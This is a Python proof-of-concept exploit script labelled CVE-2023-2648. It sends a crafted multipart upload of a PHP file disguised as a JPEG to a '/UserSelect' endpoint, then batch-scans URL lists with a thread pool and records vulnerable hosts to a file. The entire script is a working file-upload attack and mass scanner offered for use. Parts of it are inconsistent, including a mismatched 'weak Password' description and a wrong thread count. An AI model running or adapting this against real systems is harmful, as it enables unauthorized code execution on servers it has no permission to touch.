#-*- coding: utf-8 -*-
import argparse
import sys
import requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()



def banner():
    test = """
 
███████╗ █████╗ ███╗   ██╗██╗    ██╗███████╗██╗
██╔════╝██╔══██╗████╗  ██║██║    ██║██╔════╝██║
█████╗  ███████║██╔██╗ ██║██║ █╗ ██║█████╗  ██║
██╔══╝  ██╔══██║██║╚██╗██║██║███╗██║██╔══╝  ██║
██║     ██║  ██║██║ ╚████║╚███╔███╔╝███████╗██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚══╝╚══╝ ╚══════╝╚═╝
                                               

            tag:  this is a cve—2023-2648  poc                                       
            @version: 1.0.0   @author: bob           
"""
    print(test)


def poc(target):
    headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "null",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
        "Connection": "close",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt"

    }
    data = {
        "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n"
        "Content-Disposition: form-data; name=\"Fdiledata\"; filename=\"uploadify.php.\"\r\n"
        "Content-Type: image/jpeg\r\n"
        "\r\n"
        "<?php phpinfo();?>\r\n"
        "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--"
    }
    url = target+"/UserSelect"
    try:
        response = requests.get(url,headers=headers,data=data,verify=False,timeout=5)
        if response.status_code == 200:
            print(f"[+]{target} is valuable")
            with open("result.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[+]{target} is not valuable")
    except:
         print(f"[*] {target} error")

def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))


        mp = Pool(10)  # 创建一个拥有20个线程的线程池
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




if __name__ == '__main__':
    main()
